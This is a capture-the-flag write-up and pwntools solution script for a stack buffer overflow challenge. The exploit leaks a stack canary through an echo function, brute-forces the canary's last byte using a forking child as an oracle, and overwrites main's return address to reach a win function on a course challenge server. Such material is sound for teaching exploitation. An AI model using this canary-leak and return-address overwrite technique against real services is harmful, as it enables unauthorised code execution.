"""
# #7 BASH - Basic Asynchronous Shell

## Type
Pwn

## Vulnerability type
Memory corruption: buffer overflow

## Description
Take a look at my new shell! It leverages the power of linux's multiplexing capabilities to provide a fast and responsive shell experience.

## Explaination
By running the `checksec` command, it can be observed that the program is protected against overflows by canaries.
Debugging the executable using `gdb` command yields valuable insights. 
Inside gdb, by running the `disass main`, `disass echo` and `disass toUpper` commands, it can be observed where the canaries are placed:

```assembly
0x00000000004013c8 <+154>:   mov    rax,QWORD PTR [rbp-0x8]
0x00000000004013cc <+158>:   sub    rax,QWORD PTR fs:0x28
0x00000000004013d5 <+167>:   je     0x4013dc <toUpper+174>
0x00000000004013d7 <+169>:   call   0x401060 <__stack_chk_fail@plt>
```

In order to jump to the win function, it can be exploited the `return` instruction of the `main` function. 
However, the `return` instructions of the two other functions are not viable options. 
That's because, within the `win` function, the executable verifies if the process's PID matches that of its parent. 
Further examination of the C code reveals that these two functions are exclusively invoked by child processes spawned by the parent through `fork`. 
Thus, their primary purpose is to extract and validate the canary value. 

To retrieve the canary value, the initial step involves determining the offset between the memory location of the variable responsible for storing user input and the canary.
To do this, it is possible to exploit the `toUpper` function:

```bash
gef> set follow-fork-mode child  # specify that we want to follow the child process during the debug
gef> disass toUpper              # disassemble the toUpper function
gef> b *0x0000000000401360       # breakpoint set at gets
gef> b *0x00000000004013c8       # breakpoint set when the canary is loaded to be checked
gef> pattern create 100          # generate a random pattern of 100 bytes
gef> r

# Run the program and enter (by selecting 2) inside the toUpper function

gef> c                           # First breakpoint reached

# Insert the pattern previously created

get> x/gx $rbp-0x8               # Second breakpoint reached. Let's read the value of the canary (now tainted)

# Save the canary value

get> pattern offset ... # Insert the canary value previously extracted

# Obtain the offset
```

- Now, we can exploit the `echo` function to partially retrieve the value of the canary. However, this retrieval is only partial due to the limitations of the `printf` function, which we use to print the canary's content. 
Since `printf` is restricted to printing only 79 characters, the last character of the canary remains unknown. 

- To achieve this, a script is necessary as we must handle raw bytes. 
With the offset known (72), we invoke the `echo` function and provide an input of 72 random characters. 
By doing so, we overwrite the null byte of the canary, allowing `printf` to proceed uninterrupted. 
Consequently, we are able to extract the first 7 characters of the canary.

- However, since `printf` has a character limit of 79, the last character of the canary remains unknown. 
We employ a brute-force approach to determine this character by iterating through all 256 possible values. 
The `toUpper` function serves as a validator due to its lack of constraints on input/output. 
To validate the canary, we call the `toUpper` function with a string comprising 72 random characters, followed by the known bytes of the canary and then the unknown byte. 
If the canary is incorrect, the program will trigger an error, such as "stack smashing detected". 
Conversely, the absence of errors indicates the canary's correctness, enabling its utilization within the `main` function.

- Within `main`, we send a string containing 72 random characters, followed by the canary, then 8 random characters and, finally, the address of the `win` function (extracted using `readelf -a ... | grep win`). 
The additional 8 characters account for the space between the canary and the return instruction of the `main`.

- Upon completion, we send "3" to the program to trigger an exit. 
Subsequently, upon encountering the return instruction, the program will jump to the address of the `win` function.
"""

from pwn import * 
from Crypto.Util.number import long_to_bytes

if __name__ == "__main__":

    canary_offset = 72
    win_function = 0x00000000004011f6

    # Connect to the server
    p = remote("cyberchallenge.disi.unitn.it", 50200)

    # Replace the null byte of the canary with a different byte so the printf function can print the canary
    p.sendlineafter(b"3. Exit\n", b"1")
    p.sendlineafter(b"Data to be echoed: \n", b"A" * canary_offset)

    p.recvline()

    # It is not possible to retrieve all the 8 bytes of the canary.
    # This is due to the limitations of the printf inside the ehco function that only prints 79 characters
    canary = b"\x00" + p.recv(6)

    # Brute force the last byte of the canary
    # We use the toUpper function as oracle since it has no limitations on the characters in output (in terms of length)
    final_canary = None

    for i in range(256):
        b = long_to_bytes(i)

        print(" "*100, end="\r")
        print(f"[{i}] Trying with: {b}", end="\r")

        # Generate a temporary canary with the new byte
        tmp_canary = canary + b
        tmp_canary = int.from_bytes(tmp_canary, "little")
        
        # Generate the payload
        payload = b"A" * canary_offset + p64(tmp_canary) # type: ignore

        # Send the payload
        p.sendlineafter(b"3. Exit\n", b"2")
        p.sendlineafter(b"Data to be uppercased: \n", payload)

        # Get the response message
        line = p.recvuntil(b"2. Uppercase\n")
        
        # If this error appears, it means that the canary was modified -> incorrect canary
        # If not, the canary was correct and we can use it
        if "stack smashing detected" not in line.decode():
            final_canary = canary + b
            print(f"Leaked canary: {hex(tmp_canary)}")

            break

    # Inject payload with the correct canary
    # This time we also add 8 characters because it is the distance between the canary and the return instruction of the main function
    final_canary_int = int.from_bytes(final_canary, "little")
    payload = b"A" * canary_offset + p64(final_canary_int) + b"B" * 8 + p64(win_function) # type: ignore

    p.sendline(payload)
    p.sendlineafter(b"3. Exit\n", b"3")

    flag = p.recvline_contains(b"Congratulations! Here is the flag:")
    flag = flag.decode().split(":")[1].strip()

    print(flag)